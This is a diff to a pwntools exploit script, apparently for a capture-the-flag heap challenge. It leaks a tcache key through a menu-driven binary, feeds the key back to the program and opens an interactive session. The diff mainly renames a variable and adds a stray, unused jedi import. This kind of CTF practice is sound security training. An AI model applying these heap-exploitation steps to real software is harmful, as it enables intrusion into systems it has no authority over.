@@ -1,3 +1,4 @@
+from jedi.cache import time_cache
 from pwn import *
 
 context.log_level = "DEBUG"
@@ -26,15 +27,15 @@ def menu(p, option):
     p.recvuntil(b"> ")
     p.sendline(str(option).encode())
 
-def make(p, key: str, free_key = None):
+def make(p, key: str, tcache_key = None):
     p.recvuntil(b"Give me an identifier for the key (max 8 characters)\n")
     p.recvuntil(b"> ")
     p.send(key.encode())
     p.recvuntil(b"Key created! How do you like it??\n")
     p.recvline()
     p.recvuntil(b"What is tcache key? Do you have any guesses?\n")
-    if free_key:
-        p.send(str(free_key))
+    if tcache_key:
+        p.send(str(tcache_key))
     else:
         p.sendline()
 
@@ -70,8 +71,8 @@ menu(p, 3)
 edit(p, "AAAAAAAA")
 
 menu(p, 2)
-free_key = review(p)
+tcache_key = review(p)
 
 menu(p, 1)
-make(p, 'AAAAAAAA', free_key)
+make(p, 'AAAAAAAA', tcache_key)
 p.interactive()
